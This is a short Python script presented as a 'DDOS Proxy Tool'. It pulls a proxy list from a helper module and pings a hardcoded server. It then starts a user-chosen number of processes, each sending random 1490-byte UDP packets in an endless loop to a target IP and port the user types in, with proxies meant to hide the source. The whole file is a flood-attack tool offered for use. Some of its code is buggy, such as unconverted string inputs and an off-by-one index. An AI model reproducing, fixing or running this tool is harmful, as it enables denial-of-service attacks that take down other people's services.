import os
import sys
from Proxy_get import Proxysget
from multiprocessing import Process
import socket
import socks  # pip install PySocks
import random
import subprocess


def ipmake(ipss):
    string = str(ipss)
    ips = string.replace("{", "").replace("}", "").replace(":", "").replace("HTTP", "").replace("'", "").replace(
        "*", ":").replace(" ", "")
    return (ips)


def boom(ip, port):
    fnull = open(os.devnull, 'w')
    ipaddr = 'ping 140.143.63.30'
    result = subprocess.call(ipaddr + ' -n 2', shell=True, stdout=fnull, stderr=fnull)
    if result:
        print('Fail to get proxys！！')
        t.close()
        sys.exit(0)
    else:
        global byte
        byte = os.urandom(1490)
        global list1
        list1 = Proxysget()
    print(len(list1))
    if len(list1) == 0:
        sys.exit(1)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        add = ipmake(list1[random.randint(0, len(list1))])
        socks.set_default_proxy(socks.HTTP, addr=add.split(':')[0], port=add.split(':')[1])  # 设置socks代理
        socket.socket = socks.socksocket
        sock.sendto(byte, (ip, port))


if __name__ == '__main__':
    ip = "1.1.1.1"
    port = 80
    print("////////////////////////////////\r")
    print("\r")
    print("DDOS Proxy Tool by TesterNaN")
    print("\r")
    print("////////////////////////////////\r")
    ip = input("IP:")
    port = input("Port:")
    i = input("Process number:")
    print("Working……")
    for i in range(i):
        t = Process(target=boom,args=(ip,port))
        t.start()